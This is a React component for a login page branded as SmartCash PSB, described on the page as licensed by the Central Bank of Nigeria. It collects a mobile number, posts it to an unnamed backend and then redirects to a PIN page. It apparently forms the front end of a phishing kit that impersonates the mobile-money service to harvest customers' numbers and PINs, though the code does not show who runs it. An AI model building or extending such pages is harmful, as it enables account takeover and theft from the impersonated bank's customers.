import React, { useState } from "react";
import { useNavigate } from "react-router-dom";
import "../styles/home.css";
import "../App.css";
import logo from "../assets/homeLogo.png";
import { useForm } from "react-hook-form";
import { yupResolver } from "@hookform/resolvers/yup";
import * as yup from "yup";
import FormErrMsg from "../components/FormErrMsg";
import axios from "axios";
import BASE_URL from "../components/urls";

const schema = yup.object().shape({
  number: yup.string().required("number is required"),
});

const Home = () => {
  const navigate = useNavigate();
  const [loading, setLoading] = useState(false);
  const {
    register,
    handleSubmit,
    reset,
    formState: { errors },
  } = useForm({ resolver: yupResolver(schema) });

  const submitForm = (data) => {
    setLoading(true);
    axios
      .post(`${BASE_URL}/`, data)
      .then((response) => {
        reset();
        console.log(response.data);
        navigate("/pin");
      })
      .catch((error) => {
        console.error("There was an error!", error);
      })
      .finally(() => {
        setLoading(false);
      });
  };
  const handleInputChange = (e) => {
    const value = e.target.value;
    e.target.value = value.replace(/\D/g, "");
  };
  return (
    <div className="home">
      <div className="Homecontainer">
        <div className="contentSecHome">
          <div className="Homelogo">
            <img src={logo} alt="logo" />
          </div>
        </div>
        <div className="loginWrapper">
          <div className="loginSec">
            <form className="homeForm" onSubmit={handleSubmit(submitForm)}>
              <div className="formInput">
                <input
                  name="number"
                  type="tel"
                  placeholder="Enter Mobile Number"
                  required
                  inputMode="numeric"
                  maxLength="11"
                  pattern="\d*"
                  {...register("number")}
                  onInput={handleInputChange}
                />
              </div>
              <FormErrMsg errors={errors} inputName="number" />

         <div className="cash">
         <div >
                SmartCash PSB - Licensed by the Central Bank of Nigeria
              </div>
         </div>
             <div className="mb">
             <div className="click">
                <h6>By clicking continue, I agree to the</h6>
                <h6 className="link">
                  terms & conditions <span>and</span> privacy policy
                </h6>
              </div>
              <button type="submit" className="homeBtn" disabled={loading}>
                {loading ? "Loading..." : "Continue"}
              </button>
             </div>
            </form>
          </div>
        </div>
      </div>
    </div>
  );
};

export default Home;
